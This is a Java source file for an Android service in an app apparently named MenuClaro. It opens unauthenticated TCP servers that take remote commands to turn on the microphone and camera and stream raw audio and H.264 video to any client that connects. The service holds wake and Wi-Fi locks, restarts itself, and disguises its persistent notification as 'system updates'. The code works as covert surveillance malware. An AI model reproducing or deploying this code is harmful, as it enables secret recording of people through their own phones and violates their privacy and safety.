package com.menuclaro;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaRecorder;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class StreamService extends Service {

    public static boolean isRunning = false;

    private static final String CHANNEL_ID = "MenuClaroStream";
    private static final int PORT_AUDIO    = 9999;
    private static final int PORT_VIDEO    = 9998;
    private static final int PORT_COMMAND  = 9997;

    // 720p por defecto, calidad alta
    private static final int WIDTH    = 1280;
    private static final int HEIGHT   = 720;
    private static final int BITRATE  = 1_500_000; // 1.5 Mbps
    private static final int FPS      = 30;

    private PowerManager.WakeLock  wakeLock;
    private WifiManager.WifiLock   wifiLock;
    private AudioRecord            audioRecord;

    private volatile boolean streaming       = false;
    private volatile boolean audioActive     = false;
    private volatile boolean videoActive     = false;
    private volatile boolean switchRequested = false;

    private volatile int sampleRate  = 44100;
    private volatile int channelMode = AudioFormat.CHANNEL_IN_MONO;

    private volatile int currentCameraIndex = 0;
    private String[] cameraIds;

    private volatile PrintWriter cmdWriter = null;

    // Recursos de cámara
    private volatile CameraCaptureSession activeSession = null;
    private volatile CameraDevice         activeCamera  = null;
    private volatile MediaCodec           videoEncoder  = null;
    private volatile Surface              encoderSurface = null;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf(); return START_NOT_STICKY;
        }
        if (isRunning) return START_STICKY;

        startForegroundNotification();
        acquireWakeLock();
        acquireWifiLock();
        streaming = true;
        isRunning = true;

        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            cameraIds = manager.getCameraIdList();
        } catch (Exception e) { cameraIds = new String[]{"0"}; }

        startCommandServer();
        startAudioServer();
        startVideoServer();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        streaming = false;
        isRunning = false;
        stopAudio();
        closeCameraAndEncoder();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(1, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).build());
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MenuClaro::WakeLock");
        wakeLock.acquire();
    }

    private void acquireWifiLock() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "MenuClaro::WifiLock");
            wifiLock.acquire();
        } catch (Exception ignored) {}
    }

    // ─── Cerrar cámara y encoder correctamente ─────────────
    private void closeCameraAndEncoder() {
        try {
            if (activeSession != null) {
                try { activeSession.stopRepeating(); } catch (Exception ignored) {}
                try { activeSession.abortCaptures(); } catch (Exception ignored) {}
                activeSession.close(); activeSession = null;
            }
            if (activeCamera != null) {
                activeCamera.close(); activeCamera = null;
            }
            // Cerrar encoder DESPUÉS de la cámara
            if (videoEncoder != null) {
                try { videoEncoder.signalEndOfInputStream(); } catch (Exception ignored) {}
                try { videoEncoder.stop(); } catch (Exception ignored) {}
                videoEncoder.release(); videoEncoder = null;
            }
            if (encoderSurface != null) {
                encoderSurface.release(); encoderSurface = null;
            }
        } catch (Exception ignored) {}
    }

    private void checkIdle() {
        new Thread(() -> {
            try { Thread.sleep(500); } catch (Exception ignored) {}
            if (!audioActive && !videoActive) stopForeground(false);
        }).start();
    }

    // ─── COMMAND SERVER ────────────────────────────────────
    private void startCommandServer() {
        new Thread(() -> {
            while (streaming) {
                ServerSocket ss = null; Socket client = null;
                try {
                    ss = new ServerSocket(PORT_COMMAND);
                    ss.setReuseAddress(true);
                    client = ss.accept();
                    client.setTcpNoDelay(true);
                    client.setSoTimeout(90000);

                    cmdWriter = new PrintWriter(client.getOutputStream(), true);
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(client.getInputStream()));

                    String line;
                    while (streaming && (line = reader.readLine()) != null) {
                        switch (line.trim()) {
                            case "PING":         cmdWriter.println("PONG"); break;
                            case "START_AUDIO":  if (!audioActive) startAudio(); break;
                            case "STOP_AUDIO":   if (audioActive)  stopAudio();  break;
                            case "START_CAMERA": videoActive = true; break;
                            case "STOP_CAMERA":  videoActive = false; checkIdle(); break;
                            case "SWITCH_CAM":   switchRequested = true; break;
                            case "VIDEO_ON":     videoActive = true; break;
                            case "VIDEO_OFF":    videoActive = false; checkIdle(); break;
                            case "AUDIO_STEREO": channelMode = AudioFormat.CHANNEL_IN_STEREO; break;
                            case "AUDIO_MONO":   channelMode = AudioFormat.CHANNEL_IN_MONO;   break;
                            case "SR_44100":     sampleRate = 44100; break;
                            case "SR_16000":     sampleRate = 16000; break;
                        }
                    }
                } catch (Exception ignored) {
                } finally {
                    stopAudio(); videoActive = false; cmdWriter = null;
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (ss != null)     ss.close();     } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(300); } catch (InterruptedException e) { break; }
                }
            }
        }, "CommandServer").start();
    }

    // ─── AUDIO ─────────────────────────────────────────────
    private void startAudio() {
        new Thread(() -> {
            audioActive = true;
            startForegroundNotification();
            int sr  = sampleRate;
            int ch  = channelMode;
            int buf = AudioRecord.getMinBufferSize(sr, ch, AudioFormat.ENCODING_PCM_16BIT);
            audioRecord = tryCreateAudioRecord(sr, ch, buf);
            if (audioRecord == null) { audioActive = false; return; }
            audioRecord.startRecording();
        }, "AudioStarter").start();
    }

    private void stopAudio() {
        audioActive = false;
        if (audioRecord != null) {
            try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {}
            audioRecord = null;
        }
        checkIdle();
    }

    private void startAudioServer() {
        new Thread(() -> {
            while (streaming) {
                ServerSocket ss = null; Socket client = null;
                try {
                    ss = new ServerSocket(PORT_AUDIO);
                    ss.setReuseAddress(true);
                    client = ss.accept();
                    client.setTcpNoDelay(true);
                    client.setSoTimeout(20000);
                    OutputStream out = client.getOutputStream();
                    byte[] buffer = new byte[4096];
                    while (streaming && !client.isClosed()) {
                        if (audioActive && audioRecord != null) {
                            int read = audioRecord.read(buffer, 0, buffer.length);
                            if (read > 0) { out.write(buffer, 0, read); out.flush(); }
                        } else {
                            Thread.sleep(100);
                        }
                    }
                } catch (Exception ignored) {
                } finally {
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (ss != null)     ss.close();     } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(100); } catch (InterruptedException e) { break; }
                }
            }
        }, "AudioServer").start();
    }

    private AudioRecord tryCreateAudioRecord(int sr, int ch, int buf) {
        try {
            AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.UNPROCESSED,
                    sr, ch, AudioFormat.ENCODING_PCM_16BIT, buf * 4);
            if (ar.getState() == AudioRecord.STATE_INITIALIZED) return ar;
            ar.release();
        } catch (Exception ignored) {}
        try {
            AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.MIC,
                    sr, ch, AudioFormat.ENCODING_PCM_16BIT, buf * 4);
            if (ar.getState() == AudioRecord.STATE_INITIALIZED) return ar;
            ar.release();
        } catch (Exception ignored) {}
        return null;
    }

    // ─── VIDEO SERVER con H264 Zero-Copy ───────────────────
    private void startVideoServer() {
        new Thread(() -> {
            while (streaming) {
                ServerSocket ss = null; Socket client = null;
                HandlerThread bgThread = null;
                switchRequested = false;

                try {
                    ss = new ServerSocket(PORT_VIDEO);
                    ss.setReuseAddress(true);
                    client = ss.accept();
                    client.setTcpNoDelay(true);

                    bgThread = new HandlerThread("CamBg");
                    bgThread.start();
                    Handler bgHandler = new Handler(bgThread.getLooper());

                    // Crear encoder H264
                    MediaCodec encoder = createH264Encoder();
                    if (encoder == null) continue;
                    videoEncoder = encoder;
                    Surface surface = encoder.createInputSurface();
                    encoderSurface = surface;
                    encoder.start();

                    // Keyframe instantáneo al conectar
                    requestKeyFrame(encoder);

                    // Abrir cámara con surface del encoder (Zero-Copy) 🚀
                    openCamera(surface, bgHandler);

                    final Socket finalClient = client;
                    final OutputStream out = client.getOutputStream();
                    MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();

                    // Hilo que lee output del encoder y envía por red
                    new Thread(() -> {
                        try {
                            while (streaming && !finalClient.isClosed()) {
                                if (!videoActive) { Thread.sleep(100); continue; }

                                int outIndex = encoder.dequeueOutputBuffer(info, 10_000);
                                if (outIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) continue;
                                if (outIndex < 0) continue;

                                ByteBuffer outBuf = encoder.getOutputBuffer(outIndex);
                                if (outBuf == null) { encoder.releaseOutputBuffer(outIndex, false); continue; }

                                byte[] data = new byte[info.size];
                                outBuf.position(info.offset);
                                outBuf.get(data);
                                encoder.releaseOutputBuffer(outIndex, false);

                                // Protocolo: 4 bytes longitud + 1 byte flags + datos
                                byte flags = (byte)((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0 ? 1 : 0);
                                int len = data.length;
                                byte[] header = {
                                    (byte)(len>>24),(byte)(len>>16),(byte)(len>>8),(byte)len,
                                    flags
                                };
                                out.write(header);
                                out.write(data);
                                out.flush();
                            }
                        } catch (Exception ignored) {}
                    }, "EncoderReader").start();

                    // Loop principal
                    while (streaming && !client.isClosed()) {
                        if (switchRequested) {
                            switchRequested = false;
                            currentCameraIndex = (currentCameraIndex + 1) % cameraIds.length;
                            closeCameraAndEncoder();
                            Thread.sleep(400);
                            MediaCodec newEnc = createH264Encoder();
                            if (newEnc == null) break;
                            videoEncoder = newEnc;
                            Surface newSurface = newEnc.createInputSurface();
                            encoderSurface = newSurface;
                            newEnc.start();
                            requestKeyFrame(newEnc);
                            openCamera(newSurface, bgHandler);
                        }
                        Thread.sleep(50);
                    }
                } catch (Exception ignored) {
                } finally {
                    closeCameraAndEncoder();
                    try { if (bgThread != null) { bgThread.quitSafely(); bgThread.join(500); } } catch (Exception ignored) {}
                    try { if (client != null) client.close(); } catch (Exception ignored) {}
                    try { if (ss != null)     ss.close();     } catch (Exception ignored) {}
                    if (streaming) try { Thread.sleep(100); } catch (InterruptedException e) { break; }
                }
            }
        }, "VideoServer").start();
    }

    private MediaCodec createH264Encoder() {
        try {
            MediaCodec encoder = MediaCodec.createEncoderByType("video/avc");
            MediaFormat format = MediaFormat.createVideoFormat("video/avc", WIDTH, HEIGHT);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                    MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, BITRATE);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, FPS);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1);
            format.setInteger(MediaFormat.KEY_BITRATE_MODE,
                    MediaCodecInfo.EncoderCapabilities.BITRATE_MODE_CBR);
            // Baja latencia
            try { format.setInteger("latency", 0); } catch (Exception ignored) {}
            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            return encoder;
        } catch (Exception e) { return null; }
    }

    private void requestKeyFrame(MediaCodec encoder) {
        try {
            Bundle params = new Bundle();
            params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0);
            encoder.setParameters(params);
        } catch (Exception ignored) {}
    }

    private void openCamera(Surface targetSurface, Handler bgHandler) {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        final Object lock = new Object();
        try {
            manager.openCamera(cameraIds[currentCameraIndex], new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    activeCamera = camera;
                    try {
                        // Surface dummy para preview (requerido por Camera2)
                        SurfaceTexture dummy = new SurfaceTexture(0);
                        dummy.setDefaultBufferSize(WIDTH, HEIGHT);
                        Surface dummySurface = new Surface(dummy);

                        CaptureRequest.Builder builder = camera.createCaptureRequest(
                                CameraDevice.TEMPLATE_RECORD); // RECORD para video
                        builder.addTarget(targetSurface); // Zero-Copy: camera → encoder directo
                        builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON);
                        builder.set(CaptureRequest.CONTROL_AWB_MODE, CameraMetadata.CONTROL_AWB_MODE_AUTO);
                        builder.set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE,
                                new android.util.Range<>(FPS, FPS));

                        camera.createCaptureSession(Arrays.asList(dummySurface, targetSurface),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession session) {
                                        activeSession = session;
                                        try {
                                            session.setRepeatingRequest(builder.build(), null, bgHandler);
                                            synchronized (lock) { lock.notifyAll(); }
                                        } catch (Exception e) { synchronized (lock) { lock.notifyAll(); } }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession session) {
                                        synchronized (lock) { lock.notifyAll(); }
                                    }
                                }, bgHandler);
                    } catch (Exception e) { synchronized (lock) { lock.notifyAll(); } }
                }
                @Override public void onDisconnected(CameraDevice camera) {
                    camera.close(); activeCamera = null;
                    synchronized (lock) { lock.notifyAll(); }
                }
                @Override public void onError(CameraDevice camera, int error) {
                    camera.close(); activeCamera = null;
                    synchronized (lock) { lock.notifyAll(); }
                }
            }, bgHandler);
            synchronized (lock) { lock.wait(3000); }
        } catch (Exception ignored) {}
    }
}
